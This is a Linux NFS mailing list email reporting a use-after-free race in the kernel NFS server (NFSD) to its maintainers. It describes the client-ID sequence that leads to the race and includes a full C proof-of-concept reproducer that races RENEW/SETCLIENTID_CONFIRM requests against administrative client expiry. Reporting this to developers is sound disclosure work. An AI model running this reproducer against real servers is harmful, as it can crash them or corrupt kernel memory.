Return-Path: <linux-nfs+bounces-12093-lists+linux-nfs=lfdr.de@vger.kernel.org>
X-Original-To: lists+linux-nfs@lfdr.de
Delivered-To: lists+linux-nfs@lfdr.de
Received: from ny.mirrors.kernel.org (ny.mirrors.kernel.org [147.75.199.223])
	by mail.lfdr.de (Postfix) with ESMTPS id 6FE9EACE0FE
	for <lists+linux-nfs@lfdr.de>; Wed,  4 Jun 2025 17:11:07 +0200 (CEST)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by ny.mirrors.kernel.org (Postfix) with ESMTPS id 23728174406
	for <lists+linux-nfs@lfdr.de>; Wed,  4 Jun 2025 15:11:08 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id B8E3718E377;
	Wed,  4 Jun 2025 15:11:00 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="Y2ZyysVz"
X-Original-To: linux-nfs@vger.kernel.org
Received: from mail-qt1-f179.google.com (mail-qt1-f179.google.com [209.85.160.179])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7B8C14AEE0
	for <linux-nfs@vger.kernel.org>; Wed,  4 Jun 2025 15:10:57 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.160.179
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1749049860; cv=none; b=fSqNnNm4/uTY+8rgEQ1PwBNM6T76rWS4EKTWmOYMHNdcp31m3WvBsvr9LCsXi+DKeq/Z+ZZoKAEvOMpoGG5lp7jdCokuaa4ZHuHcjA0jzdnGZSNEYK9IJly336OIl3uBadWZ6HrsODyIq5INgyETxIpy9BXB5iO+50SIF76svx0=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1749049860; c=relaxed/simple;
	bh=f6lsiE8VOHll9FRywyNonmkp6Gy/aJnghzMxm5knkFs=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=VDwzLBoB7hqX5DmNyeGM4sR+1JwizrH5dfnkCHMeT44rC4eJjXWUIUeTC3QE/unZhgY6l98iWFP+HB/D4aNjNIHm5oJs+9bmWJEtUtsCOuSaje+IjUfTwR3aan3TpKb8lGDqW9nUFlWcewPzC0xwQufDF83PqKc6+qB95vMFE+M=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=Y2ZyysVz; arc=none smtp.client-ip=209.85.160.179
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-qt1-f179.google.com with SMTP id d75a77b69052e-4a43d2d5569so87051121cf.0
        for <linux-nfs@vger.kernel.org>; Wed, 04 Jun 2025 08:10:57 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1749049856; x=1749654656; darn=vger.kernel.org;
        h=cc:to:subject:message-id:date:from:in-reply-to:references
         :mime-version:from:to:cc:subject:date:message-id:reply-to;
        bh=XTdQ4zzEGubQ9B5tTfqs1GrzZXMsIKOUwB/PkSqGSA4=;
        b=Y2ZyysVzROnhdtDeBVUwg4YWzjcHhzTjiey3MADAV3Sduki3sNg0ZazAOB3TkwQx/J
         BPApAxA0VKjlSsVG4oBDjDSXebngaqi3WAzSjGYuGeloM0axe48J7KOrJTUNfP7r4R+0
         Z1X5ul8mrjjqeikr2VQqUqABwITYf4nKwsT9cW5fXSCUYf5kJeYlejE4TkzFR3871tMi
         eap8twN3LKgS0cOk8sqYcd9Qtjiaua7U2ygmt7QEssfIjm/ArhON0DMnRYXI4h7Q1bUl
         m7DHKRk+UFgWafSO4Ktm4nIBeDp0YTwP3xgE3EhZmjb0RJx9nog2hSBxmlWbI/+HOdFj
         6DUA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1749049856; x=1749654656;
        h=cc:to:subject:message-id:date:from:in-reply-to:references
         :mime-version:x-gm-message-state:from:to:cc:subject:date:message-id
         :reply-to;
        bh=XTdQ4zzEGubQ9B5tTfqs1GrzZXMsIKOUwB/PkSqGSA4=;
        b=vBT+Jhwe05BDLU2lyn65u6Ug16bQTOkGnObbGmvZX4/+JkoO87IEWguPDrRUph5DGc
         2KokaupzGQTD3Zi+9RsOzeZYMjAmCdd4NGHsvtm7t61C+yDdZH0g0OhoGu1aGORRUcm5
         metcyUUnGgwmr+rqz47ef/+I5kMVjPsnYC265J+mGq36oJ93+qGwJ6nQZr2hcSlQ9gkz
         Ml7CDNQCQoo59V75w1leW0CKJvza3i4Rq/VKtQfks1Z0Q0RycFa/xcXZUoZZdFyaLZDv
         O/N55+6izCQgfCElG5xI7rjNpNNtWGI6KNzZahyV3GEHxZnl9nfKc8MK9lzJrXFMfXYg
         tVKA==
X-Gm-Message-State: AOJu0YzuLV+c+QxIc/olwxYy4fR31WFJ3mBL8AkouByhgPfw65QOX+DV
	is12MyzQTl7WLpSw+StN8BHBXYChp7QqCyoDWh3bchjtx1/EZeZVWZGsLqy0XPUB/aOcTWexBK1
	Q8lmPe51dLFb/6cDE8oIyBZ3tN5/jxW4qkrD+yGM=
X-Gm-Gg: ASbGnctFcCwVr/nQ7aQ6TjsTYtCy7kwkWJgpTGjWJ6sCNA3VDlxG84NWXguGlokI9DG
	yk6la+Kf/M5HpNgpbWgyicOPvuKtA1qzDtxvEfFeJndnZ18bQBcUGmIP/XdYpVWcUDYy9fT5QBw
	cjXiS70v/dbnuwERpRn9u+Shb8dn0ndCP3Tl9whK1dzfo=
X-Google-Smtp-Source: AGHT+IEuyhks5MkIwH5UCKgklJ5g04Q+FpC4K7301mgpef03AXenKaLy8wrrTB1YqNZHVY5pRUPP97jrUxPuf6ZeYhk=
X-Received: by 2002:ac8:6f11:0:b0:4a3:1b23:2862 with SMTP id
 d75a77b69052e-4a5a582b28cmr53110151cf.50.1749049855344; Wed, 04 Jun 2025
 08:10:55 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-nfs@vger.kernel.org
List-Id: <linux-nfs.vger.kernel.org>
List-Subscribe: <mailto:linux-nfs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-nfs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <CAEBF3_awnZBTOuHvTaxzRaEO552vPgSdTL1ygGkUbenYDDS5Tg@mail.gmail.com>
In-Reply-To: <CAEBF3_awnZBTOuHvTaxzRaEO552vPgSdTL1ygGkUbenYDDS5Tg@mail.gmail.com>
From: lei lu <llfamsec@gmail.com>
Date: Wed, 4 Jun 2025 23:10:43 +0800
X-Gm-Features: AX0GCFtwjhMfy8nahgkoWxQWPz3It1_omC0zwKBIZjz8YpDuenTB36vwimS66SY
Message-ID: <CAEBF3_b=UvqzNKdnfD_52L05Mqrqui9vZ2eFamgAbV0WG+FNWQ@mail.gmail.com>
Subject: Re: [BUG] An UAF in NFSD
To: linux-nfs@vger.kernel.org
Cc: Jeff Layton <jlayton@kernel.org>, chuck.lever@oracle.com
Content-Type: text/plain; charset="UTF-8"

Here is the reproducer, but it's not very stable.

Prerequisite:
- setclientid(id+verifier)
  conf{}
  unconf{c1[clname+clientid]}
  return clientid+confirm
- setclientid_confirm(clientid,confirm)
  conf{c1[clname+clientid]}
  unconf{} && nfsd4_probe_callback(c1)
  cb_null_proc() quickly respond nfsd4_probe_callback(c1)
- setclientid(id+verifier)
  conf{c1[clname+clientid]}
  unconf{c2[clname+clientid]}
  return clientid2+confirm2 (clientid2 is same as clientid)
- setclientid(id2+verifier)
  conf{c1[clname+clientid]}
  unconf{c2[clname+clientid], c3[clname2+clientid3]}
  return clientid3+confirm3
- setclientid_confirm(clientid3, confirm3)
  conf{c1[clname+clientid], c3[clname2+clientid3]}
  unconf{c2[clname+clientid]}
  cb_null_proc() sleep(10) in nfsd4_probe_callback(c3)
- setclientid(id2+verifier2)
  conf{c1[clname+clientid], c3[clname2+clientid3]}
  unconf{c2[clname+clientid], c4[clname2+clientid4]}
  return clientid4+confirm4

Race:
1. client_ctl_write && setclientid_confirm(clientid2,confirm2)
   Find c1 and race on it
2. compound[renew(clientid2), setclientid_confirm(clientid4,confirm4)]
   setclientid_confirm() simulates time-consuming operation
   expire_client(c3) --> Wait for nfsd41_cb_inflight_wait_complete()

Reproducer code:
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <time.h>
#include <poll.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include "libnfs.h"
#include "libnfs-raw.h"
#include "libnfs-raw-nfs4.h"
#include <event2/event.h>

#define NFSURL "nfs://127.0.0.1/mnt/nfshare?version=4"

struct client {
        struct rpc_context *rpc;
        struct event *listen_event;
        struct event *write_event;
        struct event *read_event;
        char *server;
        char *path;
        int op_len;
        int is_finished;
        verifier4 verifier;
        verifier4 verifier2;
        verifier4 verifier3;
        char *id;
        char *id2;
        char *owner;
        clientid4 clientid;
        clientid4 clientid2;
        clientid4 clientid3;
        clientid4 clientid4;
        verifier4 setclientid_confirm;
        verifier4 setclientid_confirm2;
        verifier4 setclientid_confirm3;
        verifier4 setclientid_confirm4;
        int callback_fd;
        int stage;
};

struct server {
        struct server *next;
        struct rpc_context *rpc;
        struct event *read_event;
        struct event *write_event;
};
struct server *server_list;

struct event_base *base;

static void update_events(struct rpc_context *rpc,
                          struct event *read_event,
                          struct event *write_event)
{
        int events = rpc_which_events(rpc);

        if (read_event) {
                if (events & POLLIN)
                        event_add(read_event, NULL);
                else
                        event_del(read_event);
        }
        if (write_event) {
                if (events & POLLOUT)
                        event_add(write_event, NULL);
                else
                        event_del(write_event);
        }
}

static void server_io(evutil_socket_t fd, short events, void *private_data)
{
        struct server *server = private_data;
        int revents = 0;

        if (events & EV_READ)
                revents |= POLLIN;
        if (events & EV_WRITE)
                revents |= POLLOUT;

        if (rpc_service(server->rpc, revents) < 0) {
                fprintf(stderr, "rpc_service() failed for server\n");
                exit(1);
        }

        update_events(server->rpc, server->read_event, server->write_event);
}

static void free_server(struct server *server)
{
        if (server->rpc) {
                rpc_disconnect(server->rpc, NULL);
                rpc_destroy_context(server->rpc);
                server->rpc = NULL;
        }
        if (server->read_event) {
                event_free(server->read_event);
                server->read_event = NULL;
        }
        if (server->write_event) {
                event_free(server->write_event);
                server->write_event = NULL;
        }

        free(server);
}

static void client_io(evutil_socket_t fd, short events,
                      void *private_data)
{
        struct client *client = private_data;
        struct server *server;
        int revents = 0;

        if (events & EV_READ)
                revents |= POLLIN;
        if (events & EV_WRITE)
                revents |= POLLOUT;

        if (rpc_service(client->rpc, revents) < 0) {
                fprintf(stderr, "rpc_service failed\n");
                exit(1);
        }
        update_events(client->rpc, client->read_event, client->write_event);

        if (client->is_finished) {
                event_free(client->listen_event);
                client->listen_event = NULL;

                event_free(client->read_event);
                client->read_event = NULL;
                event_free(client->write_event);
                client->write_event = NULL;

                for (server = server_list; server; server = server->next) {
                        if (server->read_event) {
                                event_free(server->read_event);
                                server->read_event = NULL;
                        }
                        if (server->write_event) {
                                event_free(server->write_event);
                                server->write_event = NULL;
                        }
                }
        }
}

static void send_race_renew(struct rpc_context *rpc, rpc_cb cb,
                            void *private_data)
{
        struct client *client = private_data;
        COMPOUND4args args;
        nfs_argop4 op[2];

        memset(op, 0, sizeof(op));
        op[0].argop = OP_RENEW;
        op[0].nfs_argop4_u.oprenew.clientid = client->clientid2;
        op[1].argop = OP_SETCLIENTID_CONFIRM;
        op[1].nfs_argop4_u.opsetclientid_confirm
                .clientid = client->clientid4;
        memcpy(op[1].nfs_argop4_u.opsetclientid_confirm.setclientid_confirm,
               client->setclientid_confirm4, NFS4_VERIFIER_SIZE);

        memset(&args, 0, sizeof(args));
        args.argarray.argarray_len = sizeof(op)/sizeof(nfs_argop4);
        args.argarray.argarray_val = op;

        if (rpc_nfs4_compound_task(rpc, cb, &args, private_data) == NULL) {
                fprintf(stderr, "Failed to send nfs4 RENEW request\n");
                exit(1);
        }
}

static void send_setclientid_confirm(struct rpc_context *rpc, rpc_cb cb,
                                     void *private_data)
{
        struct client *client = private_data;
        COMPOUND4args args;
        nfs_argop4 op[1];

        memset(op, 0, sizeof(op));
        op[0].argop = OP_SETCLIENTID_CONFIRM;

        if (client->stage == 1) {
                op[0].nfs_argop4_u.opsetclientid_confirm
                        .clientid = client->clientid;
                memcpy(op[0].nfs_argop4_u.opsetclientid_confirm
                        .setclientid_confirm,
                       client->setclientid_confirm, NFS4_VERIFIER_SIZE);
        } else if (client->stage == 3) {
                op[0].nfs_argop4_u.opsetclientid_confirm
                        .clientid = client->clientid3;
                memcpy(op[0].nfs_argop4_u.opsetclientid_confirm
                        .setclientid_confirm,
                       client->setclientid_confirm3, NFS4_VERIFIER_SIZE);
        } else if (client->stage == 4) {
                op[0].nfs_argop4_u.opsetclientid_confirm
                        .clientid = client->clientid2;
                memcpy(op[0].nfs_argop4_u.opsetclientid_confirm
                        .setclientid_confirm,
                       client->setclientid_confirm2, NFS4_VERIFIER_SIZE);
        }

        memset(&args, 0, sizeof(args));
        args.argarray.argarray_len = sizeof(op)/sizeof(nfs_argop4);
        args.argarray.argarray_val = op;

        if (rpc_nfs4_compound_task(rpc, cb, &args, private_data) == NULL) {
                fprintf(stderr, "Failed to send nfs4 SETCLIENTID_CONFIRM\n");
                exit(1);
        }
}

static void send_setclientid(struct rpc_context *rpc,
                             rpc_cb cb, void *private_data)
{
        struct client *client = private_data;
        COMPOUND4args args;
        nfs_argop4 op[1];
        struct sockaddr_storage ss;
        socklen_t len = sizeof(ss);
        struct sockaddr_in *in;
        struct sockaddr_in6 *in6;
        char *netid;
        char str[240], addr[256];
        unsigned short port;

        if (getsockname(client->callback_fd,
                        (struct sockaddr *)&ss, &len) < 0) {
                fprintf(stderr, "getsockname failed\n");
                exit(1);
        }

        switch (ss.ss_family) {
        case AF_INET:
                netid = "tcp";
                in = (struct sockaddr_in *)&ss;
                inet_ntop(AF_INET, &in->sin_addr, str, sizeof(str));
                port = ntohs(in->sin_port);
                break;
        case AF_INET6:
                netid = "tcp6";
                in6 = (struct sockaddr_in6 *)&ss;
                inet_ntop(AF_INET6, &in6->sin6_addr, str, sizeof(str));
                port = ntohs(in6->sin6_port);
                break;
        }
        sprintf(addr, "%s.%d.%d", str, port>>8, port&0xff);

        memset(op, 0, sizeof(op));
        op[0].argop = OP_SETCLIENTID;

        if (client->stage == 0 || client->stage == 1) {
                memcpy(op[0].nfs_argop4_u.opsetclientid.client.verifier,
                       client->verifier, sizeof(verifier4));
                op[0].nfs_argop4_u.opsetclientid.client.id
                        .id_len = strlen(client->id);
                op[0].nfs_argop4_u.opsetclientid.client.id
                        .id_val = client->id;
        } else if (client->stage == 2) {
                memcpy(op[0].nfs_argop4_u.opsetclientid.client.verifier,
                       client->verifier, sizeof(verifier4));
                op[0].nfs_argop4_u.opsetclientid.client.id
                        .id_len = strlen(client->id2);
                op[0].nfs_argop4_u.opsetclientid.client.id
                        .id_val = client->id2;
        } else if (client->stage == 3) {
                memcpy(op[0].nfs_argop4_u.opsetclientid.client.verifier,
                       client->verifier2, sizeof(verifier4));
                op[0].nfs_argop4_u.opsetclientid.client.id
                        .id_len = strlen(client->id2);
                op[0].nfs_argop4_u.opsetclientid.client.id
                        .id_val = client->id2;
        }

        op[0].nfs_argop4_u.opsetclientid.callback.cb_program = NFS4_CALLBACK;
        op[0].nfs_argop4_u.opsetclientid.callback.cb_location
                .r_netid = netid;
        op[0].nfs_argop4_u.opsetclientid.callback.cb_location.r_addr = addr;
        op[0].nfs_argop4_u.opsetclientid.callback_ident = 0x00000001;

        memset(&args, 0, sizeof(args));
        args.argarray.argarray_len = sizeof(op)/sizeof(nfs_argop4);
        args.argarray.argarray_val = op;

        if (rpc_nfs4_compound_task(rpc, cb, &args, private_data) == NULL) {
                fprintf(stderr, "Failed to send nfs4 SETCLIENTID request\n");
                exit(1);
        }
}

void renew_cb(struct rpc_context *rpc, int status,
              void *data, void *private_data)
{
        struct client *client = private_data;
        COMPOUND4res *res = data;

        if (status != RPC_STATUS_SUCCESS) {
                fprintf(stderr, "Failed to renew of server %s\n",
                        client->server);
                exit(1);
        }
        if (res->status != NFS4_OK) {
                fprintf(stderr, "Failed to renew of server %s\n",
                        client->server);
                exit(1);
        }
}

void setclientid_confirm_cb(struct rpc_context *rpc, int status,
                            void *data, void *private_data)
{
        struct client *client = private_data;
        COMPOUND4res *res = data;
        char *path;

        if (status != RPC_STATUS_SUCCESS) {
                fprintf(stderr, "Failed to confirm client id of server %s\n",
                        client->server);
                exit(1);
        }
        if (res->status != NFS4_OK) {
                fprintf(stderr, "Failed to confirm client id of server %s\n",
                        client->server);
                exit(1);
        }
}

struct pargs {
        struct rpc_context *rpc;
        struct client *client;
};

pthread_t tid1;
pthread_t tid2;

void *race_renew(void *x)
{
        struct pargs *a = (struct pargs *)x;
        send_race_renew(a->rpc, renew_cb, a->client);
}

void *race_admin(void *x)
{
        struct pargs *a = (struct pargs *)x;
        system("for ctl in /proc/fs/nfsd/clients/*/ctl; "
               "do echo \"expire\" > \"$ctl\"; done &");
        send_setclientid_confirm(a->rpc, setclientid_confirm_cb, a->client);
}

void setclientid_cb(struct rpc_context *rpc, int status,
                    void *data, void *private_data)
{
        struct client *client = private_data;
        COMPOUND4res *res = data;

        if (status != RPC_STATUS_SUCCESS) {
                fprintf(stderr, "Failed to set client id on server %s\n",
                        client->server);
                exit(1);
        }
        if (res->status != NFS4_OK) {
                fprintf(stderr, "Failed to set client id on server %s\n",
                        client->server);
                exit(1);
        }

        if (client->stage == 0) {
                client->stage = 1;
                client->clientid = res->resarray.resarray_val[0]
                        .nfs_resop4_u.opsetclientid
                        .SETCLIENTID4res_u.resok4.clientid;
                memcpy(client->setclientid_confirm,
                       res->resarray.resarray_val[0]
                       .nfs_resop4_u.opsetclientid
                       .SETCLIENTID4res_u.resok4.setclientid_confirm,
                       NFS4_VERIFIER_SIZE);
                // printf("Got clientid: %lu\n", client->clientid);
                send_setclientid_confirm(rpc, setclientid_confirm_cb, client);
                sleep(1);
                send_setclientid(rpc, setclientid_cb, client);
        } else if (client->stage == 1) {
                client->stage = 2;
                client->clientid2 = res->resarray.resarray_val[0]
                        .nfs_resop4_u.opsetclientid
                        .SETCLIENTID4res_u.resok4.clientid;
                memcpy(client->setclientid_confirm2,
                       res->resarray.resarray_val[0]
                       .nfs_resop4_u.opsetclientid
                       .SETCLIENTID4res_u.resok4.setclientid_confirm,
                       NFS4_VERIFIER_SIZE);

                send_setclientid(rpc, setclientid_cb, client);
        } else if (client->stage == 2) {
                client->stage = 3;
                client->clientid3 = res->resarray.resarray_val[0]
                        .nfs_resop4_u.opsetclientid
                        .SETCLIENTID4res_u.resok4.clientid;
                memcpy(client->setclientid_confirm3,
                       res->resarray.resarray_val[0]
                       .nfs_resop4_u.opsetclientid
                       .SETCLIENTID4res_u.resok4.setclientid_confirm,
                       NFS4_VERIFIER_SIZE);

                send_setclientid_confirm(rpc, setclientid_confirm_cb, client);
                sleep(1);
                send_setclientid(rpc, setclientid_cb, client);
        } else if (client->stage == 3) {
                client->stage = 4;
                client->clientid4 = res->resarray.resarray_val[0]
                        .nfs_resop4_u.opsetclientid
                        .SETCLIENTID4res_u.resok4.clientid;
                memcpy(client->setclientid_confirm4,
                       res->resarray.resarray_val[0]
                       .nfs_resop4_u.opsetclientid
                       .SETCLIENTID4res_u.resok4.setclientid_confirm,
                       NFS4_VERIFIER_SIZE);

                // Start to race here.
                sleep(1);
                struct pargs *a = malloc(sizeof(struct pargs));
                a->rpc = rpc;
                a->client = client;
                pthread_create(&tid1, 0, race_renew, a);
                pthread_create(&tid2, 0, race_admin, a);
        }
}

int need_sleep = 0;

static int cb_null_proc(struct rpc_context *rpc, struct rpc_msg *call,
                        void *opaque)
{
        printf("Call cb_null_proc\n");

        need_sleep++;
        if (need_sleep == 2) {
                // sleep(10);
                sleep(15);
        }

        rpc_send_reply(rpc, call, NULL, (zdrproc_t)zdr_void, 0);

        return 0;
}

static int cb_compound_proc(struct rpc_context *rpc,
                            struct rpc_msg *call,
                            void *opaque)
{
        CB_COMPOUND4args *args = call->body.cbody.args;

        fprintf(stderr, "cb_compound_cb. Do something here\n");

        return 0;
}

struct service_proc pt[] = {
        { CB_NULL, cb_null_proc, (zdrproc_t)zdr_void, 0 },
        {
                CB_COMPOUND, cb_compound_proc,
                (zdrproc_t)zdr_CB_COMPOUND4args,
                sizeof(CB_COMPOUND4args)
        },
};

static void client_accept(evutil_socket_t s, short events,
                          void *private_data)
{
        struct client *client = private_data;
        struct server *server;
        struct sockaddr_storage ss;
        socklen_t len = sizeof(ss);
        int fd;

        server = malloc(sizeof(struct server));
        if (server == NULL) {
                fprintf(stderr, "Failed to malloc server\n");
                exit(1);
        }
        memset(server, 0, sizeof(*server));
        server->next = server_list;
        server_list = server;

        if ((fd = accept(s, (struct sockaddr *)&ss, &len)) < 0) {
                free_server(server);
                fprintf(stderr, "Accept failed\n");
                exit(1);
        }
        evutil_make_socket_nonblocking(fd);

        server->rpc = rpc_init_server_context(fd);
        if (server->rpc == NULL) {
                free_server(server);
                fprintf(stderr, "Failed to create server rpc context\n");
                exit(1);
        }

        rpc_register_service(server->rpc, NFS4_CALLBACK, NFS_CB,
                             pt, sizeof(pt)/sizeof(pt[0]));

        server->read_event = event_new(base, fd, EV_READ|EV_PERSIST,
                                       server_io, server);
        server->write_event = event_new(base, fd, EV_WRITE|EV_PERSIST,
                                        server_io, server);
        update_events(server->rpc, server->read_event, server->write_event);
}

void connect_cb(struct rpc_context *rpc, int status,
                void *data, void *private_data)
{
        struct client *client = private_data;
        struct sockaddr_storage ss;
        socklen_t len = sizeof(ss);
        struct sockaddr_in *in;
        struct sockaddr_in6 *in6;

        if (status != RPC_STATUS_SUCCESS) {
                fprintf(stderr, "Connection to NFSv4 server %s failed\n",
                        client->server);
                exit(1);
        }

        if (getsockname(rpc_get_fd(rpc), (struct sockaddr *)&ss, &len) < 0) {
                fprintf(stderr, "getsockname failed\n");
                exit(1);
        }
        switch (ss.ss_family) {
        case AF_INET:
                in = (struct sockaddr_in *)&ss;
                in->sin_port = 0;
                break;
        case AF_INET6:
                in6 = (struct sockaddr_in6 *)&ss;
                in6->sin6_port = 0;
                break;
        default:
                fprintf(stderr, "Can not handle AF_FAMILY: %d", ss.ss_family);
                exit(1);
        }

        client->callback_fd = socket(AF_INET, SOCK_STREAM, 0);
        if (client->callback_fd == -1) {
                fprintf(stderr, "Failed to create callback socket\n");
                exit(1);
        }
        evutil_make_socket_nonblocking(client->callback_fd);
        if (bind(client->callback_fd,
                 (struct sockaddr *)&ss, sizeof(ss)) < 0) {
                fprintf(stderr, "Failed to bind callback socket\n");
                exit(1);
        }
        if (listen(client->callback_fd, 16) < 0) {
                fprintf(stderr, "Failed to listen to callback socket\n");
                exit(1);
        }
        client->listen_event = event_new(base, client->callback_fd,
                                         EV_READ|EV_PERSIST,
                                         client_accept, private_data);
        event_add(client->listen_event, NULL);

        send_setclientid(rpc, setclientid_cb, client);
}

// gcc reproducer.c -o reproducer -I/usr/include/nfsc -lnfs -levent
int main(int argc, char *argv[])
{
        struct nfs_context *nfs;
        struct nfs_url *url;
        struct client client;
        int i, fd;

        base = event_base_new();
        if (base == NULL) {
                fprintf(stderr, "Failed to create event context\n");
                exit(1);
        }

        nfs = nfs_init_context();
        if (nfs == NULL) {
                fprintf(stderr, "Failed to init context\n");
                exit(1);
        }
        url = nfs_parse_url_dir(nfs, NFSURL);
        if (url == NULL) {
                fprintf(stderr, "Failed to parse url\n");
                exit(1);
        }

        memset(&client, 0, sizeof(client));
        client.rpc = nfs_get_rpc_context(nfs);
        client.is_finished = 0;
        client.server = url->server;
        client.path = &url->path[1];
        client.stage = 0;
        srandom(time(NULL));
        for (i = 0; i < NFS4_VERIFIER_SIZE; i++)
                client.verifier[i] = random() & 0xff;
        for (i = 0; i < NFS4_VERIFIER_SIZE; i++)
                client.verifier2[i] = random() & 0xff;
        for (i = 0; i < NFS4_VERIFIER_SIZE; i++)
                client.verifier3[i] = random() & 0xff;
        asprintf(&client.id, "Libnfs %s tcp", NFSURL);
        asprintf(&client.id2, "Libnfs %s tcp2", NFSURL);
        asprintf(&client.owner, "open id:libnfs pid: %d", getpid());
        client.callback_fd = -1;

        if (rpc_connect_program_async(client.rpc, url->server,
                                      NFS4_PROGRAM, NFS_V4,
                                      connect_cb, &client) != 0) {
                fprintf(stderr, "Failed to start connection\n");
                exit(1);
        }

        fd = rpc_get_fd(client.rpc);
        client.read_event = event_new(base, fd, EV_READ|EV_PERSIST,
                                      client_io, &client);
        client.write_event = event_new(base, fd, EV_WRITE|EV_PERSIST,
                                       client_io, &client);
        update_events(client.rpc, client.read_event, client.write_event);

        event_base_dispatch(base);

        close(client.callback_fd);

        free(client.id);
        free(client.owner);

        while (server_list) {
                struct server *server = server_list;
                server_list = server->next;
                free_server(server);
        }

        nfs_destroy_url(url);
        nfs_destroy_context(nfs);

        event_base_free(base);

        return 0;
}

